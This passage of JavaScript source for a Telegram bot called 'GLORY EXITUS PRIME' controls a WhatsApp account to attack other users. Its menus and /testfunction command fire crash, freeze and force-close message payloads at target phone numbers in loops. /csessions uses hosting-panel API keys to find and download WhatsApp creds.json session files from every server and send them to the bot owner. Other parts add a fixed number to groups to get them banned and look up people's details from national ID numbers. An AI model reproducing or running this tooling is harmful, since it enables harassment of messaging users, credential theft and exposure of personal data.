        if (bypass.includes(cmdName)) return next();
        if (isBlocked(cmdName)) {
            return ctx.reply(`⛔ Command /${cmdName} sedang diblokir oleh owner.`);
        }
        return next();
    } catch (e) {
        return next();
    }
});




const { exec } = require('child_process');

let isRestarting = false;

setInterval(() => {
  if (isRestarting) return;
  isRestarting = true;

  console.log("🔄 Restart sistem...");

  // ⚡ Langsung keluar → panel akan nyalakan ulang otomatis!
  process.exit(0);
}, 500 * 1000); // ← 10 detik

console.log("Restart otomatis AKTIF — tiap 500 detik");


// ==== Normal Style ==== \\
function getMainKeyboard() {
    return {
        inline_keyboard: [
            [
                {
                    text: "『ッ』 ʙᴜɢ",
                    callback_data: "/bug",
                    style: "Primary"
                },
            ],
            [
                {
                    text: "『ッ』 sᴇᴛᴛɪɴɢs",
                    callback_data: "/controls",
                    style: "Danger"
                }
            ],
            [
                {
                    text: "『ッ』 ᴀᴜᴛʜᴏʀ",
                    url: "https://t.me/R4f14ndr4",
                    style: "Success"
                },
                {
                    text: "『ッ』 ᴄʜᴀɴɴᴇʟ",
                    url: "https://t.me/GLORYEXITUS",
                    style: "Success"
                }                
            ],
        ]
    };
}


// === Start Menu ===
bot.start(async (ctx) => {
    try {
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
        const runtimeStatus = formatRuntime();
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();

        const menuMessage = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b></blockquote>`;

        await ctx.replyWithPhoto(thumbnailUrl, {
            caption: menuMessage,
            parse_mode: "HTML",
            reply_markup: getMainKeyboard()
        });

    } catch (err) {
        console.error("Start Menu Error:", err);
    }
});


// === Home Button ===
bot.action("/homee", async (ctx) => {
    try {
        await ctx.answerCbQuery();

        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
        const runtimeStatus = formatRuntime();
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();

        const menuMessage = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b></blockquote>`;

        await ctx.editMessageCaption(menuMessage, {
            parse_mode: "HTML",
            reply_markup: getMainKeyboard()
        });

    } catch (err) {
        console.error("Home Menu Error:", err);
    }
});
 
bot.action('/controls', async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
  const runtimeStatus = formatRuntime();
  const controlsMenu = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b>
↺ SETTINGS MENU
<b>↯ /requestpair - Add Sender Number</b>
<b>↯ /setcooldown - Set Bot Cooldown</b>
<b>↯ /resetsession - Reset Existing Session</b>
<b>↯ /addpremium - Add Premium Users</b>
<b>↯ /delpremium - Delete Premium Users</b>
<b>↯ /addgcpremium - Add Premium Group</b>
<b>↯ /delgcpremium - Delete Premium Group</b>
<b>↯ /block - Blockcmd, Unblockcmd</b> </blockquote>`;

  const keyboard = [
      [
          { text: "『ッ』 ᴛᴏᴏʟs", callback_data: "/tools", style: "Danger" },
          { text: "『ッ』 ʙᴀᴄᴋ", callback_data: "/homee", style: "Success" }
      ]
  ];

  try {
      await ctx.editMessageCaption(controlsMenu, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: keyboard }
      });
  } catch {}
});

bot.action('/bug', async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
  const runtimeStatus = formatRuntime();
  const bugMenu = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b>
↺ 𝗕𝘆 𝗥𝗮𝗳𝗶
「 вυg мєηυ 」
<b>↯ /forceclose - FORCECLOSE WHATSAPP BEBAS SPAM</b>
<b>↯ /xprime - BLANK NO KLIK INVISIBLE</b>
<b>↯ /xfreeze - FREEZE WHATSAPP BEBAS SPAM</b>
<b>↯ /xfc - FORCECLOSE WHATSAPP 24 JAM</b>
<b>↯ /testfunction - TEST YOUR BUG FUNCTION</b> </blockquote>`;

  const keyboard = [
      [
          { text: "『ッ』 ᴛǫ ᴛᴏ", callback_data: "/tqto", style: "Success" },
          { text: "『ッ』 ʙᴀᴄᴋ", callback_data: "/homee", style: "Primary" }
      ]
  ];

  try {
      await ctx.editMessageCaption(bugMenu, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: keyboard }
      });
  } catch {}
});

bot.action('/tools', async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
  const runtimeStatus = formatRuntime();
  const toolsMenu = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b>
↺ TOOLS MENU
<b>↯ /trackip - Searching for IP Information</b>
<b>↯ /tiktokdl - Download Content Without Watermark</b>
<b>↯ /nikparse - View Full Nik Information</b>
<b>↯ /csessions - Retrieving Session From Panel Server</b>
<b>↯ /convert - Convert Photos Or Videos To Links</b>
<b>↯ /infofunction - Testing the model function that we have</b>
<b>↯ /bangc - Only for old numbers or safe saved numbers for ban group</b></blockquote>`;

  const keyboard = [
      [
          { text: "『ッ』 ʙᴀᴄᴋ", callback_data: "/homee", style: "Danger" }
      ]
  ];

  try {
      await ctx.editMessageCaption(toolsMenu, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: keyboard }
      });
  } catch {}
});

bot.action('/tqto', async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "Yes✅" : "No❌";
  const runtimeStatus = formatRuntime();
  const tqtoMenu = `
<blockquote>↺ GLORY EXITUS PRIME
<b>↯ Developer : @R4f14ndr4</b>
<b>↯ Version : 3.5.0 </b>
<b>↯ Runtime : ${runtimeStatus}</b>
<b>↯ Stats Sender : ${senderStatus}</b>
↺ THANKS TO
<b>↯ @R4f14ndr4 - The Developer</b>
<b>↯ Lian - Best Support</b>
<b>↯ VnX Team - Function Support</b>
<b>↯ All Member - Support</b> </blockquote>`;

  const keyboard = [
      [
          { text: "『ッ』 ʙᴀᴄᴋ", callback_data: "/homee", style: "Primary" }
      ]
  ];

  try {
      await ctx.editMessageCaption(tqtoMenu, {
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: keyboard }
      });
  } catch {}
}); 

// ==== TOOLS ===== //
bot.command("trackip", checkAccess, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ IP: ${data.ip || "-"}
↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
↯ Region: ${data.region || "-"}
↯ City: ${data.city || "-"}
↯ ZIP: ${data.postal || "-"}
↯ Timezone: ${data.timezone_gmt || "-"}
↯ ISP: ${data.isp || "-"}
↯ Org: ${data.org || "-"}
↯ ASN: ${data.asn || "-"}
↯ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("tiktokdl", checkAccess, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkAccess, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ NIK: ${get(d.nik) || nik}
↯ Nama: ${get(d.nama)}
↯ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
↯ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
↯ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
↯ Umur: ${get(d.umur)}
↯ Provinsi: ${get(d.provinsi || d.province)}
↯ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
↯ Kecamatan: ${get(d.kecamatan || d.district)}
↯ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("csessions", checkAccess, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("convert", checkAccess, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("testfunction", checkWhatsAppConnection, checkAccess, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 3)
      return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)");

    const q = args[1];
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function");

    const processMsg = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      { url: thumbnailUrl },
      {
        caption: `<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ Target: ${q}
↯ Type: Unknown Function
↯ Status: Process`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );
    const processMessageId = processMsg.message_id;

    const safeSock = createSafeSock(sock);
    const funcCode = ctx.message.reply_to_message.text;
    const match = funcCode.match(/async function\s+(\w+)/);
    if (!match) return ctx.reply("❌ ☇ Function tidak valid");
    const funcName = match[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    };
    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (err) {
        // Error di dalam loop diabaikan sesuai kode asli
      }
      await sleep(200);
    }

    const finalText = `<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ Target: ${q}
↯ Type: Unknown Function
↯ Status: Success`;

    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMessageId,
        undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      );
    } catch (e) {
      await ctx.replyWithPhoto(
        { url: thumbnailUrl },
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      );
    }
  } catch (err) {
    // Error utama diabaikan sesuai kode asli
  }
});

bot.command("infofunction", checkAccess, checkCooldown, async (ctx) => {

  const blocked = getBlocked();
  if (blocked.includes("xprime")) {
    return ctx.reply("⛔ Command ini sedang diblok oleh owner.");
  }


  try {
    const replied = ctx?.message?.reply_to_message?.text || ctx?.message?.reply_to_message?.caption || "";
    if (!replied) return ctx.reply("🪧 ☇ Format: /infofunction ( reply function )");

    const code = replied.trim();
    const sig =
      code.match(/async\s+function\s+([A-Za-z0-9_]+)\s*\(([^)]*)\)/) ||
      code.match(/const\s+([A-Za-z0-9_]+)\s*=\s*async\s*\(([^)]*)\)\s*=>/);
    if (!sig) return ctx.reply("❌ ☇ Function tidak valid");

    const funcName = sig[1];
    const params = (sig[2] || "").trim();

    const use  = (re) => re.test(code);
    const find = (re) => (code.match(re) || []).length;

    const flags = {
      sendMessage:  use(/\bsendMessage\s*\(/),
      relayMessage: use(/\brelayMessage\s*\(/),
      genMsg:       use(/\bgenerateWAMessageFromContent\s*\(/),
      prepMedia:    use(/\bprepareWAMessageMedia\s*\(/),
      fwdContent:   use(/\bgenerateForwardMessageContent\s*\(/),
      viewOnce:     use(/\bviewOnceMessage\b/),
      nativeFlow:   use(/\bnativeFlowMessage\b/),
      extAd:        use(/\bexternalAdReply\b/),
      location:     use(/\blocationMessage\b|degreesLatitude\b|degreesLongitude\b/),
      liveLoc:      use(/\bliveLocationMessage\b/),
      extendedText: use(/\bextendedTextMessage\b|matchedText\b|description\b/),
      buttons:      use(/\bbuttons\s*:/),
      template:     use(/\btemplate_message\b|hydratedTemplate\b/),
      payment:      use(/\bpayment[_ ]?method\b/i),
      mention:      use(/\bmentionedJid\b|\bcontextInfo\s*:\s*{[^}]*mentionedJid/),
      bigRepeat:    use(/\.repeat\(\s*(\d{3,}|[1-9]\d{3,})\s*\)/),
    };

    const counts = {
      sendMessage:  find(/\bsendMessage\s*\(/g),
      relayMessage: find(/\brelayMessage\s*\(/g),
      repeatCalls:  find(/\.repeat\s*\(/g),
    };

    const deps = [
      flags.genMsg ? "generateWAMessageFromContent" : null,
      flags.prepMedia ? "prepareWAMessageMedia" : null,
      flags.fwdContent ? "generateForwardMessageContent" : null,
    ].filter(Boolean);

    const payloads = [];
    if (flags.extendedText) payloads.push("extendedTextMessage");
    if (flags.location)     payloads.push("locationMessage");
    if (flags.liveLoc)      payloads.push("liveLocationMessage");
    if (flags.viewOnce)     payloads.push("viewOnceMessage");
    if (flags.nativeFlow)   payloads.push("nativeFlowMessage");
    if (flags.extAd)        payloads.push("externalAdReply");
    if (flags.buttons || flags.template) payloads.push("buttons/template");

    const risks = [];
    if (counts.repeatCalls > 0 || flags.bigRepeat) risks.push("payload besar / flood");
    if (counts.relayMessage + counts.sendMessage > 3) risks.push("spam/loop pesan");
    if (flags.mention) risks.push("mention massal");
    const riskLevel = risks.length ? risks.join(", ") : "rendah (normal)";

    const effects = [];
    if (flags.sendMessage || flags.relayMessage) effects.push("Ada pemanggilan API kirim/relay pesan (potensi rate-limit)");
    if (flags.viewOnce)     effects.push("Membungkus payload sebagai View Once");
    if (flags.nativeFlow)   effects.push("Menggunakan Native Flow UI (tombol interaktif)");
    if (flags.extAd)        effects.push("Menambahkan externalAdReply (rich preview)");
    if (flags.liveLoc)      effects.push("Mengirim Live Location");
    if (flags.location)     effects.push("Mengirim Location/Pin");
    if (flags.extendedText) effects.push("Menggunakan Extended Text (field panjang)");
    if (flags.buttons || flags.template) effects.push("Memakai tombol/template interaktif");
    if (flags.payment)      effects.push("Memanggil elemen payment_method (eksperimental)");
    if (flags.bigRepeat)    effects.push("Memuat .repeat(...) besar—risiko lag/crash klien");

    const caption = `
<blockquote><pre>↯═―—⊱ ⎧ 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 ⎭ ⊰―—═↯</pre></blockquote>
↯ Function
╰┈ ⸙ ${funcName} (${params})

↯ API Usage
╰┈ ⸙ ${[flags.sendMessage ? "sendMessage" : null, flags.relayMessage ? "relayMessage" : null, ...deps].filter(Boolean).join(", ") || "—"}

↯ Payload Type
╰┈ ⸙ ${payloads.join(", ") || "—"}

↯ Risk Indicators
╰┈ ⸙ ${riskLevel}

↯ Operational Effects
╰┈ ⸙ ${effects.length ? effects.join(" ") : "—"}

`.trim();

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menganalisis function");
  }
});

function getCurrentDate() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

// REMOVED: function groupBan() - HAPUS TOTAL

// ONLY BanGroup function remains
async function BanGroup(target) {
    if (!target.endsWith('@g.us')) {
        throw '@g.us server required';
    }

    group = target;

    try {
        await sock.groupParticipantsUpdate(
            group,
            ['971500000000@s.whatsapp.net'],
            'add',
        );

        await sock.sendPresenceUpdate('composing', group);
    } catch (err) {
        console.error('error:', err);
        throw err;
    }
}

function extractInviteCode(link) {
